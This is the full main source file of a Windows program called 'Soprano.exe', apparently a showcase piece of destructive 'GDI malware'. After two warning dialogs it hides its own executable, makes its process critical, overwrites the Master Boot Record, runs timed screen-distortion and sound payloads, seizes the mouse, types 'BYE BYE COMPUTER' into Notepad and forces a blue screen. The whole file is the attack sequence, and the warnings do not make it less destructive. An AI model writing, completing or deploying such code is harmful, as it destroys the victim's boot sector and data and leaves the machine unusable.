#include "soprano.h"

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MsgConfirm msgConfirm(hInstance, nCmdShow);
	msgConfirm.Show();
	if (MessageBoxW(NULL, L"(PTBR)\nCara, é sério! Isso vai destruir completamente sua máquina!\n"
		L"Você realmente quer continuar a execução?\n\n"
		L"(ENG)\nDude, seriously! This will completely destroy your machine!\n"
		L"Do you really want to proceed with the execution?",
		L"Soprano.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;

	LPCWSTR startupPath = System::StartupPath();
	LPCWSTR execPath = System::PathCombine(startupPath, L"\\Soprano.exe");

	System::FileHide(execPath);

	Sleep(rand() % 5000);

	System::SetProcessCritical();

	MBR::OverwriteMBR();

	HANDLE hPayload1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload1 = CreateThread(NULL, NULL, &PayloadsGdi::Load1, hPayload1, NULL, NULL);
	HANDLE tBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::Beat1, hBytebeat1, NULL, NULL);

	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayload1, hPayload1);
	Bytebeats::Abort(tBytebeat1, hBytebeat1);
	System::cls();

	HANDLE hPayload2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload2 = CreateThread(NULL, NULL, &PayloadsGdi::Load2, hPayload2, NULL, NULL);
	HANDLE tBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::Beat2, hBytebeat2, NULL, NULL);

	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayload2, hPayload2);
	Bytebeats::Abort(tBytebeat2, hBytebeat2);
	System::cls();

	HANDLE hPayload3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload3 = CreateThread(NULL, NULL, &PayloadsGdi::Load3, hPayload3, NULL, NULL);
	HANDLE tBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::Beat3, hBytebeat3, NULL, NULL);

	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayload3, hPayload3);
	Bytebeats::Abort(tBytebeat3, hBytebeat3);
	System::cls();

	HANDLE tBeatBeap = CreateThread(NULL, NULL, &Bytebeats::BeatBasicPalygon, NULL, NULL, NULL);
	HANDLE tPayloadPolygon1 = CreateThread(NULL, NULL, &PolygonsFormsGdi::Hexagon, NULL, NULL, NULL);
	HANDLE tPayloadPolygon2 = CreateThread(NULL, NULL, &PolygonsFormsGdi::Triangle, NULL, NULL, NULL);
	Sleep(1000 * 12);  // 12s
	System::ThreadAbort(tBeatBeap, 0);
	HANDLE hPayload4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload4 = CreateThread(NULL, NULL, &PayloadsGdi::Load4, hPayload4, NULL, NULL);
	HANDLE tBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::Beat4, hBytebeat4, NULL, NULL);


	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayloadPolygon1, 0);
	System::ThreadAbort(tPayloadPolygon2, 0);

	System::ThreadAbort(tPayload4, hPayload4);
	Bytebeats::Abort(tBytebeat4, hBytebeat4);
	System::cls();

	HANDLE hPayload5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload5 = CreateThread(NULL, NULL, &PayloadsGdi::Load5, hPayload5, NULL, NULL);
	HANDLE tBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::Beat5, hBytebeat5, NULL, NULL);

	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayload5, hPayload5);
	Bytebeats::Abort(tBytebeat5, hBytebeat5);
	System::cls();

	HANDLE hPayload6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE hBytebeat6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tPayload6 = CreateThread(NULL, NULL, &PayloadsGdi::Load6, hPayload6, NULL, NULL);
	HANDLE tBytebeat6 = CreateThread(NULL, NULL, &Bytebeats::Beat6, hBytebeat6, NULL, NULL);
	HANDLE tLoadIcon = CreateThread(NULL, NULL, &PayloadsGdi::LoadIconEffect, NULL, NULL, NULL);

	Sleep(1000 * 15); // 15s

	System::ThreadAbort(tPayload6, hPayload6);
	System::ThreadAbort(tLoadIcon, NULL);
	Bytebeats::Abort(tBytebeat6, hBytebeat6);
	System::cls();

	Sleep(5000);

	HANDLE hMousePerm = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
	HANDLE tMousePerm = CreateThread(NULL, NULL, &System::MouseNoPermi, hMousePerm, NULL, NULL);

	Sleep(1000);

	CONST BYTE VK_R = 0x52;  // KEY 'R'
	System::PressKey(VK_LWIN, VK_R, 0);  // WinLeft + R

	Sleep(1500);
	System::TypeText(L"notepad.exe", 100);

	Sleep(800);
	System::PressKey(VK_RETURN, 0, 0);  // ENTER

	Sleep(2600);
	System::TypeText(L"BYE BYE COMPUTER  :)", 100);

	Sleep(1500);
	System::BSOD();  // KILL PC

	Sleep(INFINITE);
	return 0x00;
}